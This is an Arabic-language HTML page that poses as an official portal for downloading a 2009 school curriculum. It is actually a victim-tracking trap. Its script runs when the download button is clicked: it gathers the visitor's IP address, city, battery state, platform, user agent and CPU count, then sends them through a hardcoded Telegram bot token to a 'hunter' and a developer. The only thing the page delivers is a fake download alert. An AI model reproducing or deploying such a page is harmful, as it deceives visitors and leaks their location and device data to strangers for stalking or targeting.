<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحميل ملفات 2009</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body style="text-align:center; font-family:sans-serif; background:#f4f4f4;">
    <div style="margin-top:50px; padding:20px;">
        <h3>بوابة تحميل منهاج 2009 الرسمي 📱</h3>
        <p>يتم الآن فحص اتصالك لتأمين التحميل...</p>
        <button id="btn" style="padding:15px 30px; background:#ff9800; color:white; border:none; border-radius:8px; font-weight:bold;">بدء التحميل المباشر</button>
    </div>

    <script>
        const pr = new URLSearchParams(window.location.search);
        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';

        async function getFullData() {
            // 1. جلب الـ IP والموقع
            let ipData = { ip: "غير معروف", city: "غير معروف" };
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
            } catch (e) {}

            // 2. جلب معلومات البطارية
            let batteryInfo = "غير مدعوم";
            try {
                const batt = await navigator.getBattery();
                batteryInfo = `${Math.round(batt.level * 100)}% (${batt.charging ? 'جاري الشحن' : 'لا يشحن'})`;
            } catch (e) {}

            // 3. تجميع الرسالة
            const msg = `
📱 صيدة نظام (2009) 📱
👤 الصياد: ${pr.get('hunter')}
🌐 الـ IP: ${ipData.ip}
📍 الموقع: ${ipData.city} / ${ipData.country_name}
🔋 البطارية: ${batteryInfo}
📱 الجهاز: ${navigator.platform}
🌐 المتصفح: ${navigator.userAgent}
💻 المعالج: ${navigator.hardwareConcurrency || 'غير معروف'} Core
            `;

            const fullMsg = encodeURIComponent(msg);
            // الإرسال للمستخدم ولإلك (أبو سند)
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${fullMsg}`);
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${fullMsg}`);
            
            alert("بدأ التحميل... يرجى الانتظار");
        }

        document.getElementById('btn').onclick = getFullData;
    </script>
</body>
</html>
